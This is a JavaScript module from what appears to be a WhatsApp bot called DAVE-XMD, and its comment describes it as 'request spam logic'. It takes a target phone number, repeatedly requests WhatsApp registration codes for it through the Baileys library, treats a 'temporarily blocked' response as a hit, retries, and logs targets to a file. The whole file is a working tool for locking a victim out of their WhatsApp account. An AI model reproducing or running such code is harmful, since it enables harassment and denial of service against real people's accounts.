const fs = require('fs');
const pino = require('pino');
const chalk = require('chalk');
const gradient = require('gradient-string');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

// Load or initialize temporary numbers list
const numbers = JSON.parse(fs.readFileSync('./Temporary/T.json', 'utf-8') || '{}');

// Global temp memory
if (!(global.temmp instanceof Array)) global.temmp = [];

/**
 * Temporary WhatsApp request spam logic.
 * 
 * @param {Object} XeonBotInc - Not used, just keeping for reference
 * @param {Object} m - Message object
 * @param {string} kodenegara - Country code (e.g. 254)
 * @param {string} nomortarget - Local number (e.g. 712345678)
 * @param {string} from - Chat ID
 */
const temporary = async (XeonBotInc, m, kodenegara, nomortarget, from) => {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('.mm');
        const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
        });

        const phoneNumber = `${kodenegara}${nomortarget}`;
        const ddi = kodenegara;
        const number = nomortarget;

        console.log(chalk.cyan.bold(`[ 𝐃𝐀𝐕𝐄-𝐗𝐌𝐃 ⚔️ ] Trying temporary drop -> +${phoneNumber}`));

        // Store in T.json
        numbers[phoneNumber] = { ddi, number };
        fs.writeFileSync('./Temporary/T.json', JSON.stringify(numbers, null, 2));

        const dropNumber = async (context, retryCount = 0) => {
            try {
                const { phoneNumber, ddi, number } = context;

                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 666
                });

                const blocked = res?.reason === 'temporarily_unavailable';

                if (blocked) {
                    console.log(gradient('red', 'yellow')(`🔥 +${res.login}@s.whatsapp.net temporarily blocked!`));

                    if (retryCount >= 5) {
                        console.log(chalk.red(`🚫 Retry limit reached for +${phoneNumber}`));
                        return;
                    }

                    setTimeout(() => {
                        dropNumber(context, retryCount + 1);
                    }, (res.retry_after || 10) * 1000);

                } else {
                    console.log(chalk.green(`✅ Request for +${phoneNumber} succeeded.`));
                }

            } catch (err) {
                console.log(chalk.redBright(`❌ Error for +${phoneNumber}: ${err.message}`));
            }
        };

        dropNumber({ phoneNumber, ddi, number });

    } catch (e) {
        console.error(chalk.red('💥 Internal Error in temporary module:'), e);
    }
};

module.exports = { temporary, temmp: global.temmp };
